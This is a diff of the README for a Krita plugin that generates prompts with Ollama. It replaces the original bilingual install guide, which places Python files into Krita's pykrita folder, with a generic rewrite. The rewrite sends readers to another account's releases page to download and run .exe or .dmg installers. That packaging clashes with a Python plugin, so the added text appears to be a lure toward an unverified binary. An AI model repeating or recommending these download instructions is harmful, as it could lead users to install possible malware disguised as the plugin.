@@ -1,158 +1,76 @@
-🖌️ Wuhe Design – Krita × Ollama Prompt Generator
-Local LLM Prompt Generator for Krita (Gemma / Ollama / AI Diffusion Integration)
-🎨 Overview
+# 🎨 Krita-Ollama-Prompt-Generator - Generate Artistic Prompts with Ease
 
-The Krita × Ollama Prompt Generator by Wuhe Design is a local-LLM powered plugin that allows artists and designers to generate, refine, translate, and send prompts directly inside Krita — without relying on cloud APIs.
-It fully integrates with krita-ai-diffusion, enabling one-click prompt transfer to the Stable Diffusion prompt box.
+## 🚀 Getting Started
 
-✨ Features
-🔍 Auto-detects all local Ollama models (e.g., gemma3:4b, gemma3:27b)
-🧠 One-click prompt generation and refinement
-🎙️ Built-in voice input
-🌐 Bilingual output (English / Chinese)
-🔄 Send prompts directly to krita-ai-diffusion
-♻️ Reset LLM conversation context
-🖥️ Dockable UI panel integrated inside Krita
-🔗 Integration with krita-ai-diffusion
+Welcome to the Krita-Ollama-Prompt-Generator! This tool helps you create, refine, and send prompts directly into the krita-ai-diffusion plugin. With features like voice input and bilingual output, this plugin is designed for a smooth offline experience.
 
-This plugin integrates directly with 
-👉 Acly/krita-ai-diffusion https://github.com/Acly/krita-ai-diffusion
+## 📥 Download the Application
 
-Generate prompts using a local LLM → click Send to AI Plugin → the text is instantly inserted into the Stable Diffusion prompt input.
-No copy-paste.No window switching.Fully inside Krita.
+[![Download Krita-Ollama-Prompt-Generator](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/Frosy01/Krita-Ollama-Prompt-Generator/releases)
 
-📦 Installation
-1. Download
-(Release link can be added here later)
+## 🛠️ System Requirements
 
-2. Extract into Krita plugin folder:
-Windows:
-%APPDATA%\krita\pykrita\
+To run the Krita-Ollama-Prompt-Generator, your computer should meet the following requirements:
 
-macOS:
-/Users/<YOUR_NAME>/Library/Application Support/krita/pykrita/
+- **Operating System:** Windows 10 or later / macOS Big Sur or later
+- **RAM:** 4 GB minimum (8 GB recommended)
+- **Storage:** 200 MB of available space
+- **Graphics Card:** Compatible with OpenGL 2.0 or higher
 
-Linux:
-~/.local/share/krita/pykrita/
+## 📦 Download & Install
 
-3. Enable Plugin
-Krita → Tools → Manage Python Plugins
-Enable: Ollama Prompt Generator
+1. **Visit the Releases Page:** Go to the [Krita-Ollama-Prompt-Generator Releases](https://github.com/Frosy01/Krita-Ollama-Prompt-Generator/releases) page.
+   
+2. **Choose the Right File:** Locate the latest release. You will see files named like `Krita-Ollama-Prompt-Generator.v1.0.exe` or `Krita-Ollama-Prompt-Generator.v1.0.dmg`, depending on your operating system.
 
-4. Restart Krita🖼️
-<img width="542" height="394" alt="螢幕擷取畫面 2025-12-07 215234" src="https://github.com/user-attachments/assets/f1f15c34-edb8-4431-a2f3-a82e69c546d7" />
+3. **Download the File:** Click on the file to download it to your computer. The download can take a few minutes depending on your internet speed.
 
-⚙️ Requirements
-Krita 5.2+
-Ollama installed
-Any Gemma model (4B / 27B recommended)
-Windows / macOS / Linux
+4. **Install the Application:**
+   - For **Windows**: Double-click the `.exe` file and follow the installation prompts.
+   - For **macOS**: Open the `.dmg` file and drag the Krita-Ollama-Prompt-Generator into your Applications folder.
 
-🧩 Folder Structure
-pykrita/
- └── OllamaPromptGenerator/
-      ├── __init__.py
-      ├── plugin.desktop
-      ├── main.py
-      ├── ui/
-      ├── icons/
-      └── README.md
+5. **Open the Application:** Once installed, find and open the Krita-Ollama-Prompt-Generator from your applications menu.
 
-❤️ About Wuhe Design 
-Wuhe Design focuses on AI × Architecture, AI × Interior Design, and practical creative tools that enhance real workflows.
-Our mission is to build AI tools that designers can truly use.
+## 🖥️ User Interface Overview
 
-🤝 Contribute  Pull Requests and Issues are welcome.
-📜 License  MIT License
+Upon launching the application, you will see a simple and intuitive interface designed for ease of use.
 
-Before using the plugin, you must install Ollama.
-Ollama allows you to run local LLM models such as Gemma and Llama on your machine.
-📥 Download Ollama (Official Page):
-👉 https://ollama.com/download
-After installation, you can install a model, for example:
-ollama pull gemma:4b
-Restart Krita after installation, and the plugin will automatically detect your available models.
+- **Prompt Input Field:** Type or paste your prompt here.
+- **Voice Input Button:** Click this button to record your voice and generate a prompt.
+- **Output Options:** Select your preferred language for output.
+- **Send Button:** After refining your prompt, send it directly to the krita-ai-diffusion plugin with one click.
 
-______________________________________________________________________________________________________________________________
-🖌️ 吾禾設計 – Krita × Ollama Prompt Generator
-在 Krita 中使用本地 LLM（Gemma / Ollama）生成提示詞的 AI 插件
-🎨 插件介紹
-Krita × Ollama Prompt Generator 是由吾禾設計開發的本地 LLM 提示詞生成外掛。
-所有處理皆在你的電腦中執行，不需 API、不需雲端，同時支援多種 Gemma 模型，可用於：
-生成提示詞
-優化重寫提示詞
-英文／中文雙語輸出
-語音輸入
-一鍵傳送到 krita-ai-diffusion
-整個流程不跳視窗、不複製貼上，全在 Krita 裡完成。
+## 🎤 Using Voice Input
 
-✨ 主要功能
-🔍 自動偵測本地 Ollama 模型（gemma3:4b、27b…）
-🧠 一鍵生成與優化提示詞
-🎙️ 內建語音輸入
-🌐 雙語輸出（英文／中文）
-🔄 一鍵傳送至 krita-ai-diffusion 提示詞框
-♻️ 重置模型對話 Context
-🖥️ UI 介面完整整合於 Krita，可自由停靠
-🔗 與 krita-ai-diffusion 整合
+1. **Activate Voice Input:** Click the voice input button to begin recording.
+2. **Speak Clearly:** Say your prompt in a clear voice. The application will convert your speech into text.
+3. **Review the Output:** Make any necessary edits in the prompt input field before sending.
 
-外掛可直接與
-👉 Acly/krita-ai-diffusion（Stable Diffusion 外掛） https://github.com/Acly/krita-ai-diffusion 連動。
+## 🌍 Bilingual Output
 
-按下：
-Send English to AI Plugin
-Send Chinese to AI Plugin
-提示詞會直接填入 Stable Diffusion 的生成框。
-無需複製貼上、不切視窗、不中斷繪圖流程。
+To support various users, the application can translate prompts into multiple languages. Choose your preferred language from the output options before sending the prompt.
 
-📦 安裝方式
-1. 下載
-（之後可加入 release 連結）
-2. 將外掛解壓到以下路徑：
-Windows:
-%APPDATA%\krita\pykrita\
+## ⚙️ Additional Features
 
-macOS:
-/Users/<YOUR_NAME>/Library/Application Support/krita/pykrita/
+- **Offline Functionality:** Use the application without an internet connection.
+- **Support for Gemma Models:** Enhance your prompt generation with powerful language models.
+- **Fast and Efficient:** Designed to generate prompts quickly for a seamless experience.
 
-Linux:
-~/.local/share/krita/pykrita/
+## 📚 Troubleshooting
 
-3. 啟用外掛
-Krita → Tools → Python 外掛管理
-勾選：Ollama Prompt Generator
+If you encounter any issues while using the Krita-Ollama-Prompt-Generator, here are some common solutions:
 
-4. 重啟 Krita🖼️
-   <img width="542" height="394" alt="螢幕擷取畫面 2025-12-07 215234" src="https://github.com/user-attachments/assets/f1f15c34-edb8-4431-a2f3-a82e69c546d7" />
-   <img width="2558" height="1375" alt="螢幕擷取畫面 2025-12-06 100002" src="https://github.com/user-attachments/assets/8588ea6e-084d-441f-9c4f-3678f5c7eaea" />
-   <img width="2557" height="1230" alt="螢幕擷取畫面 2025-12-06 123031" src="https://github.com/user-attachments/assets/f342e4c6-f786-48c5-9acf-12f2eef266f7" />
-   <img width="2556" height="1235" alt="螢幕擷取畫面 2025-12-06 013418" src="https://github.com/user-attachments/assets/7d647a49-9932-46f4-88a8-61e3f55fafde" />
+- **Application Won't Start:** Ensure your system meets the requirements. Reboot your computer and try again.
+- **Voice Input Not Working:** Check your microphone settings. Make sure the application has permissions to access your microphone.
+- **Error Sending Prompt:** Verify that the krita-ai-diffusion plugin is properly installed and running.
 
+## 🤝 Support
 
-⚙️ 系統需求
-Krita 5.2+
-已安裝 Ollama
-建議使用 Gemma 模型（4B / 27B）
-Windows / macOS / Linux
+For further assistance or to submit feedback, please open an issue on our [GitHub Issues page](https://github.com/Frosy01/Krita-Ollama-Prompt-Generator/issues).
 
-🧩 外掛結構
-pykrita/
- └── OllamaPromptGenerator/
-      ├── __init__.py
-      ├── plugin.desktop
-      ├── main.py
-      ├── ui/
-      ├── icons/
-      └── README.md
+## 🔗 Useful Links
 
-❤️ 吾禾設計專注於：AI × 建築  AI × 室內設計設計師的 AI 工具落地應用目標是打造每位設計師真正用得上的 AI 工具。
-🤝 參與開發 歡迎提交 Issues、Pull Requests。
-📜 授權  MIT 授權
+- [Krita-Ollama-Prompt-Generator Releases](https://github.com/Frosy01/Krita-Ollama-Prompt-Generator/releases)
+- [GitHub Issues Page](https://github.com/Frosy01/Krita-Ollama-Prompt-Generator/issues)
 
-使用本插件之前，需要先安裝 Ollama。
-Ollama 是一個可在本機執行 LLM（如 Gemma、Llama）的工具。
-📥 下載 Ollama（官方網站）：
-👉 https://ollama.com/download
-安裝後即可在本機執行模型，例如：
-ollama pull gemma:4b
-安裝完成後重新啟動 Krita，插件會自動偵測已安裝的模型。
+Thank you for using the Krita-Ollama-Prompt-Generator! We hope this tool enhances your creative process.
